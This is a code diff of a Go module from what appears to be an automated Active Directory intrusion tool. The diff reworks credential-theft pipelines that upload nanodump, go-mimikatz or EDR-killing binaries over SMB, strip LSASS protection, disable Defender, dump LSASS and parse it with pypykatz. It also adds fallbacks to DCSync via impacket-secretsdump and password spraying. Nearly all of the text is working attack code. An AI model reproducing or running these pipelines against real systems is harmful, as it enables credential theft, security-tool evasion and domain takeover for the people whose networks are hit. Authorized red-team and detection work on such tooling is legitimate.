@@ -7,20 +7,18 @@ import (
 	"context"
 	"fmt"
 	"os"
-	"path/filepath"
 	"strings"
 	"time"
-	"unicode"
 )
 
 var acquisitionPipelines = map[string]PipelineDef{
-	"standard": {
-		Name:        "standard",
-		Delivery:    "donut",
-		PayloadType: "go-mimikatz",
+	"undefend": {
+		Name:        "undefend",
+		Delivery:    "exe",
+		PayloadType: "undefend",
 		RemoteExec:  true,
-		ParseFn:     parseMimikatzOutput,
-		Description: "Donut-wrap go-mimikatz, upload via SMB, execute via WMI/WinRM, retrieve output",
+		ParseFn:     parseNanodumpOutput,
+		Description: "Upload nanodump.exe via SMB, fork dump LSASS, parse with pypykatz",
 	},
 	"pplshade": {
 		Name:        "pplshade",
@@ -30,22 +28,6 @@ var acquisitionPipelines = map[string]PipelineDef{
 		ParseFn:     parseNanodumpOutput,
 		Description: "Upload PPLShade.exe + driver, strip LSASS PPL protection, dump with nanodump --fork",
 	},
-	"edrfreeze": {
-		Name:        "edrfreeze",
-		Delivery:    "exe",
-		PayloadType: "edrfreeze",
-		RemoteExec:  true,
-		ParseFn:     parseNanodumpOutput,
-		Description: "Upload EDR-Freeze.exe + nanodump.exe via SMB, freeze EDR for 3s, dump LSASS",
-	},
-	"undefend": {
-		Name:        "undefend",
-		Delivery:    "exe",
-		PayloadType: "undefend",
-		RemoteExec:  true,
-		ParseFn:     parseNanodumpOutput,
-		Description: "Upload UnDefend.exe + nanodump.exe, kill Defender, fork dump LSASS",
-	},
 	"phantomkiller": {
 		Name:        "phantomkiller",
 		Delivery:    "exe",
@@ -53,14 +35,6 @@ var acquisitionPipelines = map[string]PipelineDef{
 		RemoteExec:  true,
 		ParseFn:     parseNanodumpOutput,
 		Description: "Upload BootRepair.sys + PhantomKiller.exe via SMB, load signed Lenovo driver, kill EDR processes via IOCTL, dump LSASS",
-	},
-	"dcsync": {
-		Name:        "dcsync",
-		Delivery:    "donut",
-		PayloadType: "go-mimikatz",
-		RemoteExec:  false,
-		ParseFn:     parseMimikatzOutput,
-		Description: "DCSync via go-mimikatz sekurlsa::dcsync for each DA credential",
 	},
 }
 
@@ -240,12 +214,44 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 }
 
 func RunCredentialAcq(state *core.ADState, profileName string, targetHost string) *core.ToolResult {
+	result := &core.ToolResult{Success: true}
+
+	selectTarget(state, targetHost)
+
+	domain, user, pass, _ := getCredential(state)
+	if domain == "" || pass == "" {
+		return &core.ToolResult{
+			Success: false,
+			Evidence: []core.EvidenceEntry{{
+				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Source: "credential_acq", Key: "error",
+				Value:      "no credentials available for spraying",
+				Confidence: 0, Timestamp: time.Now(),
+			}},
+		}
+	}
+
+	fmt.Printf("[*] Spraying with %s\\%s\n", domain, user)
+
+	// Non-privileged: password spray, username=password, cross-domain reuse
+	sprayResult := runPasswordSpray(state, domain)
+	result.Creds = append(result.Creds, sprayResult.Creds...)
+	result.Evidence = append(result.Evidence, sprayResult.Evidence...)
+
+	if len(result.Creds) > 0 {
+		result.Success = true
+	}
+
+	return result
+}
+
+func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHost string, exec core.Executor) *core.ToolResult {
 	profile, ok := LookupProfile(profileName)
 	if !ok {
 		return &core.ToolResult{
 			Success: false,
 			Evidence: []core.EvidenceEntry{{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
 				Source: "evasion", Key: "error",
 				Value: fmt.Sprintf("unknown profile: %s", profileName),
 			}},
@@ -264,8 +270,8 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 		return &core.ToolResult{
 			Success: false,
 			Evidence: []core.EvidenceEntry{{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "credential_acq", Key: "target", Value: "none",
+				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
+				Source: "credential_acq_pipeline", Key: "target", Value: "none",
 				Confidence: 0, Timestamp: time.Now(),
 			}},
 		}
@@ -273,28 +279,15 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 
 	fmt.Printf("[*] Target: %s (%s)\n", host.IP, host.Hostname)
 
-	domain, user, pass, hash := getCredential(state)
-	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
+	fmt.Println("[*] LSASS dump via nanodump...")
 
-	var result *core.ToolResult
+	result := executeNanodumpPipeline(state, host, pipeline, exec)
 
-	switch profileName {
-	case "standard":
-		result = executeMimikatzPipeline(state, host, pipeline, exec)
-	case "bypass", "undefend":
-		result = executeUnDefendPipeline(state, host, pipeline, exec)
-	case "dcsync":
-		result = executeDCSyncPipeline(state, host, pipeline, exec)
-	default:
-		result = executeMimikatzPipeline(state, host, pipeline, exec)
-	}
-
-	// Fallback: primary pipeline failed; try impacket-secretsdump DCSync
+	// Fallback: nanodump failed; try impacket-secretsdump DCSync
 	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
-		fmt.Println("[*] Primary pipeline failed, trying DCSync via impacket-secretsdump...")
-		// Target a DC for DCSync, not the original host (which may be a member server)
+		fmt.Println("[*] nanodump failed, trying DCSync via impacket-secretsdump...")
 		dcHost := host
-		if dc := findDC(state, domain); dc.IP != "" {
+		if dc := findDC(state, host.Domain); dc.IP != "" {
 			dcHost = dc
 		}
 		fallback := executeSecretsdumpPipeline(state, dcHost)
@@ -302,11 +295,6 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 			return fallback
 		}
 	}
-
-	// Supplementary: password spraying (always runs, finds weak/default creds)
-	sprayResult := runPasswordSpray(state, domain)
-	result.Creds = append(result.Creds, sprayResult.Creds...)
-	result.Evidence = append(result.Evidence, sprayResult.Evidence...)
 
 	// Fallback: try SAM dump via nxc
 	if !result.Success {
@@ -320,6 +308,94 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 	return result
 }
 
+func isHex(s string) bool {
+	for _, r := range s {
+		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F')) {
+			return false
+		}
+	}
+	return true
+}
+
+func isBogusUsername(s string) bool {
+	lower := strings.ToLower(s)
+	return lower == "" || lower == "n/a" || lower == "�" ||
+		strings.Contains(lower, "total") ||
+		strings.Contains(lower, "---") ||
+		strings.HasPrefix(lower, "0x") ||
+		strings.HasPrefix(lower, "0:") ||
+		strings.Contains(lower, "error") ||
+		strings.Contains(lower, "failed") ||
+		strings.Contains(lower, "connection") ||
+		strings.Contains(lower, "password") ||
+		strings.Contains(lower, "warning") ||
+		strings.Contains(lower, "warn") ||
+		strings.Contains(lower, "impacket") ||
+		strings.Contains(lower, "samba") ||
+		len(s) > 50
+}
+
+func pickCred(creds []core.Credential, domain string, strict bool) (string, string, string, string) {
+	var best core.Credential
+	bestScore := -1
+	for _, c := range creds {
+		if strict && c.Domain != "" && !strings.EqualFold(c.Domain, domain) {
+			continue
+		}
+		score := 0
+		if c.Secret != "" && !strings.HasPrefix(c.Secret, "aad3b") {
+			score++
+		}
+		if c.Domain != "" && strings.EqualFold(c.Domain, domain) {
+			score++
+		}
+		if c.Username != "" && !strings.EqualFold(c.Username, c.Domain+"\\") {
+			score++
+		}
+		if c.Validated {
+			score++
+		}
+		if score > bestScore {
+			bestScore = score
+			best = c
+		}
+	}
+	if bestScore < 0 {
+		return "", "", "", ""
+	}
+	dom := best.Domain
+	if dom == "" {
+		dom = domain
+	}
+	secret := best.Secret
+	hash := best.Hash
+	if hash == "" && isHex(secret) && (len(secret) == 32 || len(secret) == 64) {
+		hash = secret
+		secret = ""
+	}
+	return dom, best.Username, secret, hash
+}
+
+func getDomainCredential(state *core.ADState, domain string) (string, string, string, string) {
+	return pickCred(state.Creds, domain, true)
+}
+
+func FilterBogusState(state *core.ADState) *core.ADState {
+	filtered := make([]core.Credential, 0, len(state.Creds))
+	for _, c := range state.Creds {
+		if state.Phases[core.PhaseCredentialAcq] == core.PhaseInProgress {
+			if strings.HasPrefix(c.Username, "krbtgt") || strings.HasPrefix(c.Username, "Guest") {
+				continue
+			}
+		}
+		if !isBogusUsername(c.Username) {
+			filtered = append(filtered, c)
+		}
+	}
+	state.Creds = filtered
+	return state
+}
+
 func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
 	if preferred != "" {
 		for _, h := range state.Hosts {
@@ -329,105 +405,20 @@ func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
 		}
 	}
 	if len(state.Hosts) > 0 {
+		// Prefer non-DC hosts (member servers) for privileged operations
 		for _, h := range state.Hosts {
-			if h.IsDC {
+			if !h.IsDC {
 				return h, true
 			}
 		}
+		// Fallback to DC if no non-DC host available
 		return state.Hosts[0], true
 	}
 	return core.Host{}, false
 }
 
 func getCredential(state *core.ADState) (string, string, string, string) {
-	for i := len(state.Creds) - 1; i >= 0; i-- {
-		c := state.Creds[i]
-		if c.Validated && c.Domain != "" && c.Username != "" {
-			return c.Domain, c.Username, c.Secret, c.Hash
-		}
-	}
-	for i := len(state.Creds) - 1; i >= 0; i-- {
-		c := state.Creds[i]
-		if c.Domain != "" && c.Username != "" {
-			return c.Domain, c.Username, c.Secret, c.Hash
-		}
-	}
-	return "", "", "", ""
-}
-
-func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-	domain, user, pass, hash := getCredential(state)
-
-	ctx := context.Background()
-
-	if pipeline.RemoteExec && domain != "" && pass != "" {
-		fmt.Printf("[*] Deploying go-mimikatz to %s via SMB...\n", host.IP)
-		remoteDir := `C:\Windows\Temp\`
-		deployR := exec.Execute(ctx, core.Action{
-			Artifact: "go-mimikatz.exe", Method: "put",
-			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
-		})
-		if !deployR.Success {
-			fmt.Println("[!] Failed to deploy go-mimikatz.exe, falling back to nanodump")
-			return executeNanodumpPipeline(state, host, pipeline, exec)
-		}
-		remotePath := deployR.Output
-
-		defer exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
-		})
-
-		mcfg := tools.DefaultGoMimikatzConfig()
-		safeCmd := sanitizeMimikatzCommand(mcfg.Command)
-		cmd := fmt.Sprintf(`%s %s`, remotePath, safeCmd)
-
-		target := tools.NetExecTarget{
-			Protocol: "smb", Host: host.IP,
-			Domain: domain, Username: user, Password: pass, Hash: hash,
-		}
-
-		cr, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
-		if err != nil || !cr.Success {
-			fmt.Println("[!] go-mimikatz remote execution failed, falling back to nanodump")
-			return executeNanodumpPipeline(state, host, pipeline, exec)
-		}
-
-		creds := pipeline.ParseFn(cr.Stdout)
-		result.Creds = append(result.Creds, creds...)
-		for _, c := range creds {
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
-				Value: c.Secret, Confidence: 0.8, RawOutput: cr.Stdout,
-				Timestamp: time.Now(),
-			})
-		}
-		if len(creds) > 0 {
-			fmt.Printf("[+] go-mimikatz: %d credential(s) from %s\n", len(creds), host.IP)
-		}
-		return result
-	}
-
-	fmt.Println("[*] Running go-mimikatz locally...")
-	r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
-	if err != nil || r == nil || !r.Success {
-		fmt.Println("[!] go-mimikatz local execution failed, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-
-	creds := pipeline.ParseFn(r.Stdout)
-	result.Creds = append(result.Creds, creds...)
-	for _, c := range creds {
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
-			Value: c.Secret, Confidence: 0.8, RawOutput: r.Stdout,
-			Timestamp: time.Now(),
-		})
-	}
-	result.RawOutput = r.Stdout
-	return result
+	return pickCred(state.Creds, "", false)
 }
 
 func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
@@ -558,163 +549,6 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	result.Creds = append(result.Creds, creds...)
 	result.RawOutput = r.Stdout
 	return result
-}
-
-func runDefenderKill(ctx context.Context, exec core.Executor, _ tools.NetExecTarget) {
-	if !tools.UnDefend.Available() {
-		fmt.Println("[!] UnDefend.exe not found locally, skipping Defender kill")
-		return
-	}
-
-	fmt.Println("[*] Pre-condition: Deploying UnDefend.exe (randomized name)...")
-	deployR := exec.Execute(ctx, core.Action{
-		Artifact: "UnDefend.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !deployR.Success {
-		fmt.Printf("[!] Failed to deploy UnDefend.exe: %v\n", deployR.Error)
-		return
-	}
-	remotePath := deployR.Output
-
-	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode (start /B)...")
-	exec.Execute(ctx, core.Action{
-		Artifact: remotePath, Method: "run",
-		Arguments: []string{"--aggressive"}, Timeout: 30 * time.Second,
-	})
-	time.Sleep(2 * time.Second)
-
-	exec.Execute(ctx, core.Action{
-		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
-	})
-}
-
-func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-	domain, user, pass, hash := getCredential(state)
-
-	if domain == "" || pass == "" {
-		fmt.Println("[!] No credentials for UnDefend pipeline, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-
-	target := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP,
-		Domain: domain, Username: user, Password: pass, Hash: hash,
-	}
-
-	ctx := context.Background()
-	runDefenderKill(ctx, exec, target)
-
-	fmt.Println("[*] UnDefend: Deploying nanodump.exe (randomized name)...")
-	dmpR := exec.Execute(ctx, core.Action{
-		Artifact: "nanodump.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !dmpR.Success {
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "undefend", Key: "error",
-			Value:     "nanodump upload failed: " + dmpR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	dumperPath := dmpR.Output
-	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_undefend_%d.dmp`, time.Now().UnixNano())
-	defer func() {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{dumperPath, dumpRemote},
-			Timeout: 30 * time.Second,
-		})
-	}()
-
-	fmt.Println("[*] UnDefend: Dumping LSASS via nanodump --fork...")
-	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
-	dmpR = exec.Execute(ctx, core.Action{
-		Artifact: dumpCmd, Method: "command", Timeout: 60 * time.Second,
-	})
-	if !dmpR.Success {
-		fmt.Println("[!] Dump failed")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "undefend", Key: "error",
-			Value:     "dump failed",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	fmt.Println("[*] UnDefend: Retrieving dump...")
-	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_undefend_%d.dmp", time.Now().UnixNano()))
-	getR := exec.Execute(ctx, core.Action{
-		Artifact: dumpRemote, Method: "get",
-		Arguments: []string{localDump}, Timeout: 60 * time.Second,
-	})
-	if getR.Success {
-		fmt.Println("[*] UnDefend: Parsing dump with pypykatz...")
-		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
-		if pyr.Success {
-			creds := pipeline.ParseFn(pyr.Stdout)
-			result.Creds = append(result.Creds, creds...)
-			for _, c := range creds {
-				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-					Source: "undefend", Key: c.Username + "@" + c.Domain,
-					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
-					Timestamp: time.Now(),
-				})
-			}
-		}
-	}
-	return result
-}
-
-func parseMimikatzOutput(output string) []core.Credential {
-	var creds []core.Credential
-	lines := strings.Split(output, "\n")
-	var currentUser, currentDomain string
-
-	for _, line := range lines {
-		trimmed := strings.TrimSpace(line)
-		lower := strings.ToLower(trimmed)
-
-		if strings.Contains(lower, "username") && !strings.Contains(lower, "password") {
-			parts := strings.SplitN(trimmed, ":", 2)
-			if len(parts) == 2 {
-				val := strings.TrimSpace(parts[1])
-				if val != "" && val != "(null)" {
-					currentUser = val
-				}
-			}
-		}
-		if strings.Contains(lower, "domain") && !strings.Contains(lower, "domain sid") &&
-			!strings.Contains(lower, "domain server") {
-			parts := strings.SplitN(trimmed, ":", 2)
-			if len(parts) == 2 {
-				val := strings.TrimSpace(parts[1])
-				if val != "" && val != "(null)" {
-					currentDomain = strings.TrimSpace(strings.Split(val, " ")[0])
-				}
-			}
-		}
-		if strings.Contains(lower, "password") && !strings.Contains(lower, "password last") &&
-			!strings.Contains(lower, "password never") && !strings.Contains(lower, "password required") {
-			parts := strings.SplitN(trimmed, ":", 2)
-			if len(parts) == 2 {
-				val := strings.TrimSpace(parts[1])
-				if val != "" && val != "(null)" {
-					creds = append(creds, core.Credential{
-						Type: core.CredPlaintext, Username: currentUser,
-						Domain: currentDomain, Secret: val, Source: "go-mimikatz",
-					})
-				}
-			}
-		}
-	}
-	return dedupCreds(creds)
 }
 
 func parseNanodumpOutput(output string) []core.Credential {
@@ -854,105 +688,4 @@ func parseSecretsdumpOutput(output, domain string) []core.Credential {
 		}
 	}
 	return creds
-}
-
-func sanitizeMimikatzCommand(cmd string) string {
-	var safe []rune
-	for _, r := range cmd {
-		if unicode.IsLetter(r) || unicode.IsDigit(r) || r == ':' || r == ' ' || r == '_' || r == '-' {
-			safe = append(safe, r)
-		}
-	}
-	return string(safe)
-}
-
-func executeDCSyncPipeline(state *core.ADState, _ core.Host, _ PipelineDef, _ core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-
-	if !tools.GoMimikatz.Available() {
-		fmt.Println("[!] go-mimikatz not available for DCSync")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "dcsync", Key: "error", Value: "go-mimikatz not available",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	ctx := context.Background()
-	synced := 0
-	for _, c := range state.Creds {
-		if !c.Validated {
-			continue
-		}
-		isDA := false
-		for _, u := range state.Users {
-			if u.Username == c.Username && u.Domain == c.Domain && u.IsDA {
-				isDA = true
-				break
-			}
-		}
-		if !isDA {
-			continue
-		}
-
-		fmt.Printf("[*] DCSync for %s\\%s...\n", c.Domain, c.Username)
-		req := tools.ExecutionRequest{
-			Env: map[string]string{
-				"DOMAIN": c.Domain,
-				"USER":   c.Username,
-			},
-		}
-		r, err := tools.GoMimikatz.SekurlsaDcsync(ctx, req)
-		if err != nil {
-			fmt.Printf("[!] DCSync failed for %s\\%s: %v\n", c.Domain, c.Username, err)
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "dcsync", Key: c.Username + "@" + c.Domain,
-				Value: "DCSync failed: " + err.Error(), Confidence: 0.5,
-				Timestamp: time.Now(),
-			})
-			continue
-		}
-		if r == nil || !r.Success {
-			fmt.Printf("[!] DCSync failed for %s\\%s: result unsuccessful\n", c.Domain, c.Username)
-			rawOut := ""
-			if r != nil {
-				rawOut = r.Stdout
-			}
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "dcsync", Key: c.Username + "@" + c.Domain,
-				Value: "DCSync failed", Confidence: 0.5, RawOutput: rawOut,
-				Timestamp: time.Now(),
-			})
-			continue
-		}
-
-		creds := parseMimikatzOutput(r.Stdout)
-		result.Creds = append(result.Creds, creds...)
-		for _, dc := range creds {
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "dcsync", Key: dc.Username + "@" + dc.Domain,
-				Value: dc.Secret, Confidence: 0.9, RawOutput: r.Stdout,
-				Timestamp: time.Now(),
-			})
-		}
-		synced++
-	}
-
-	if synced == 0 {
-		fmt.Println("[!] No DA credentials with validated creds found for DCSync")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "dcsync", Key: "status", Value: "no DA creds available",
-			Timestamp: time.Now(),
-		})
-	}
-
-	fmt.Printf("[*] DCSync complete: %d DA credentials synced\n", synced)
-	return result
 }
